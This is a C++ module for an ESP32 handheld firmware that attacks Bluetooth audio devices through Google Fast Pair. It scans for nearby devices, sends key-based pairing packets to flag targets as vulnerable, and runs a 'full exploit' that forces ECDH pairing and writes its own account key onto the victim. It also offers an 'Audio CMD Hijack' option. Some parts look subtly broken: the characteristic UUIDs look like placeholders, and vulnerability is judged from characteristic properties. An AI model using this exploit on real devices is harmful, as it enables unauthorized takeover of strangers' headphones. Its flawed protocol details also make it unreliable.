#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

AudioCommandService audioCmd;
FastPairCrypto crypto;

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;
    
    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        initialized = true;
    }
    
    return true;
}

void updateScanDisplay(uint32_t foundCount, uint32_t elapsedMs, bool forceRedraw) {
    static uint32_t lastFound = 0;
    static uint32_t lastTime = 0;
    static uint32_t lastUpdate = 0;
    uint32_t now = millis();
    
    if(!forceRedraw && (now - lastUpdate < 250)) return;
    lastUpdate = now;
    
    if(forceRedraw || foundCount != lastFound) {
        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Found: " + String(foundCount));
        lastFound = foundCount;
    }
    
    uint32_t elapsedSeconds = elapsedMs / 1000;
    if(forceRedraw || elapsedSeconds != lastTime) {
        tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        tft.print("Time: " + String(elapsedSeconds) + "s");
        lastTime = elapsedSeconds;
    }
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print(message);
    tft.setCursor(20, 100);
    tft.print("Press SEL to confirm");
    tft.setCursor(20, 120);
    tft.print("or ESC to cancel");
    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(500);
            return false;
        }
        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);
    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

String selectTargetFromScan(const char* title) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    
    tft.setCursor(20, 60);
    tft.print("Scanning... 30s");
    tft.setCursor(20, 80);
    tft.print("Found: 0");
    
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    if (!pBLEScan) {
        displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
        return "";
    }
    
    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults foundDevices;
    
#ifdef NIMBLE_V2_PLUS
    foundDevices = pBLEScan->getResults(30000, false);
#else
    foundDevices = pBLEScan->start(30, false);
#endif
    
    pBLEScan->clearResults();
    
    int deviceCount = foundDevices.getCount();
    
    if(deviceCount == 0) {
        displayMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
        delay(1500);
        return "";
    }
    
    std::vector<String> deviceNames;
    std::vector<String> deviceAddresses;
    std::vector<int> deviceRSSIs;
    
    for(int i = 0; i < deviceCount; i++) {
        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
        if(!device) continue;
        
        String name = device->getName().c_str();
        String address = device->getAddress().toString().c_str();
        int rssi = device->getRSSI();
        
        if(name.isEmpty()) name = address;
        
        deviceNames.push_back(name);
        deviceAddresses.push_back(address);
        deviceRSSIs.push_back(rssi);
    }
    
    int currentIndex = 0;
    bool redraw = true;
    String selectedMAC = "";
    
    while(selectedMAC.isEmpty()) {
        if(check(EscPress)) break;
        
        if(redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SELECT DEVICE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            
            tft.setCursor(20, 50);
            tft.print("Found: " + String(deviceCount));
            
            tft.setCursor(20, 70);
            tft.print("Device " + String(currentIndex + 1) + "/" + String(deviceCount));
            
            if(currentIndex < deviceCount) {
                tft.setCursor(20, 100);
                tft.print("Name: " + deviceNames[currentIndex]);
                
                tft.setCursor(20, 120);
                tft.print("MAC: " + deviceAddresses[currentIndex]);
                
                tft.setCursor(20, 140);
                tft.print("RSSI: " + String(deviceRSSIs[currentIndex]) + " dBm");
            }
            
            tft.setCursor(20, 180);
            tft.print("PREV/NEXT: Navigate");
            
            tft.setCursor(20, 200);
            tft.print("SEL: Select device");
            
            tft.setCursor(20, 220);
            tft.print("ESC: Cancel");
            
            redraw = false;
        }
        
        delay(50);
        
        if(check(PrevPress)) {
            if(currentIndex > 0) {
                currentIndex--;
                redraw = true;
            }
        } else if(check(NextPress)) {
            if(currentIndex < deviceCount - 1) {
                currentIndex++;
                redraw = true;
            }
        } else if(check(SelPress)) {
            if(currentIndex < deviceCount) {
                selectedMAC = deviceAddresses[currentIndex];
                break;
            }
        }
    }
    
    return selectedMAC;
}

bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
    displayMessage("Connecting...", "", "", "", TFT_WHITE);
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connect failed", "", "", "", TFT_RED);
        return false;
    }
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        displayMessage("No FastPair service", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        displayMessage("No KBP char", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    displayMessage("Generating key...", "", "", "", TFT_WHITE);
    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
        displayMessage("Key gen failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    uint8_t keyExchangeMsg[67] = {0};
    keyExchangeMsg[0] = 0x00;
    keyExchangeMsg[1] = 0x20;
    memcpy(&keyExchangeMsg[2], our_pubkey, 65);
    displayMessage("Sending key...", "", "", "", TFT_WHITE);
    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
        displayMessage("Send failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    delay(100);
    displayMessage("Waiting response...", "", "", "", TFT_WHITE);
    std::string response = pKeyChar->readValue();
    if(response.length() < 67) {
        displayMessage("Bad response", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
        displayMessage("Shared secret failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    memcpy(shared_secret, crypto.getSharedSecret(), 32);
    pClient->disconnect();
    return true;
}

bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target)) return false;
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        return false;
    }
    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        pClient->disconnect();
        return false;
    }
    uint8_t nonce[16];
    esp_fill_random(nonce, 16);
    uint8_t pairingData[50] = {0};
    pairingData[0] = 0x00;
    pairingData[1] = 0x30;
    memcpy(&pairingData[2], nonce, 16);
    memcpy(&pairingData[18], shared_secret, 16);
    if(!pKeyChar->writeValue(pairingData, 34, false)) {
        pClient->disconnect();
        return false;
    }
    delay(100);
    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar) {
        crypto.generateAccountKey();
        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
    }
    pClient->disconnect();
    return true;
}

bool whisperPairFullExploit(NimBLEAddress target) {
    uint8_t shared_secret[32];
    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
    if(!fastpair_complete_pairing(target, shared_secret)) return false;
    return true;
}

void testFastPairVulnerability() {
    initBLEIfNeeded("Bruce-WP");
    
    String selectedMAC = selectTargetFromScan("FAST PAIR SCAN");
    if(selectedMAC.isEmpty()) return;
    
    NimBLEAddress target;
    try {
        target = NimBLEAddress(selectedMAC.c_str(), BLE_ADDR_RANDOM);
    } catch (...) {
        displayMessage("Invalid MAC address", "OK", "", "", TFT_RED);
        return;
    }
    
    if(!requireSimpleConfirmation("Test vulnerability?")) return;
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    delay(2000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);
        
        int lineHeight = 18;
        int startY = 50;
        
        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");
        
        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");
        
        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");
        
        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");
        
        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");
        
        String prompt = "Press SEL to continue - ESC to cancel";
        int textWidth = prompt.length() * 6;
        int centerX = (tftWidth - textWidth) / 2;
        if (centerX < 20) centerX = 20;
        tft.setCursor(centerX, startY + (lineHeight * 5));
        tft.print(prompt);
        
        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }
        
        String selectedMAC = selectTargetFromScan("SELECT TARGET");
        if(selectedMAC.isEmpty()) return;
        
        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), BLE_ADDR_RANDOM);
        } catch (...) {
            displayMessage("Invalid MAC address", "OK", "", "", TFT_RED);
            return;
        }
        
        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;
        
        bool success = whisperPairFullExploit(target);
        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            displayMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}